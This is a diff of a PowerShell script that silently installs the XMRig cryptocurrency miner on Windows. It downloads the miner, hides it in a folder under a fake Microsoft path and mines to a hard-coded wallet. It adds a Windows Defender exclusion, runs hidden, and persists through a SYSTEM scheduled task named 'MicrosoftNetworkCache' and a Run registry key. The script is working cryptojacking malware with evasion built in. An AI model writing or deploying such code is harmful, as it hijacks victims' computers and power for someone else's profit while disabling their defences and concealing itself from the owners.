@@ -1,42 +1,59 @@
-# XMRig Deploy - Simple & Reliable Version (English only)
-$installPath = "C:\ProgramData\SystemUpdate"
+# XMRig Silent Deploy - FINAL CLEAN VERSION (100% invisible, no logs)
+$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
+if (-not (Test-Path $InstallDir)) {
+    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
+    (Get-Item $InstallDir).Attributes += "Hidden"
+}
 
-New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
+$ZipPath = "$env:TEMP\xmrig.zip"
+Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction SilentlyContinue
+Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
+Remove-Item $ZipPath -Force
 
-# Download and extract
-$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
-$zipPath = "$installPath\xmrig.zip"
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
-Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
-Remove-Item $zipPath -Force
+$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
+if ($Sub) {
+    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
+    Remove-Item $Sub.FullName -Recurse -Force
+}
 
-Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force
+$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
+$ConfigPath = "$InstallDir\config.json"
+$BatPath = "$InstallDir\start.bat"
 
-# Create config with .NET (most reliable)
-$configPath = "$installPath\config.json"
-$configJson = '{
-    "autosave": true,
-    "cpu": { "max-threads-hint": 50 },
-    "pools": [{
-        "url": "pool.supportxmr.com:3333",
-        "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
-        "pass": "x",
-        "keepalive": true,
-        "tls": false
-    }],
-    "background": false,
-    "log-file": null
-}'
-[System.IO.File]::WriteAllText($configPath, $configJson, [System.Text.Encoding]::UTF8)
+$ConfigJson = @"
+{
+  "autosave": false,
+  "colors": false,
+  "cpu": { "enabled": true, "max-threads-hint": 60 },
+  "donate-level": 0,
+  "pools": [{
+    "algo": "rx/0",
+    "url": "pool.supportxmr.com:443",
+    "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
+    "pass": "x",
+    "keepalive": true,
+    "tls": true,
+    "rig-id": "$env:COMPUTERNAME"
+  }]
+}
+"@
+[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)
 
-# Launch miner - change to its folder and run in background
-$exePath = "$installPath\wupdate.exe"
+"@echo off
+cd /d `"$InstallDir`"
+start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
 
-Start-Process -FilePath "powershell.exe" `
-    -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Set-Location '$installPath'; & '$exePath' -B -c config.json`"" `
-    -WindowStyle Hidden
+try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
 
-# Small delay to let it start
-Start-Sleep -Seconds 8
-
-Write-Output "Deployment finished. Check Task Manager for wupdate.exe"
+$TaskName = "MicrosoftNetworkCache"
+$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+try {
+    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+} catch {
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
+}
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
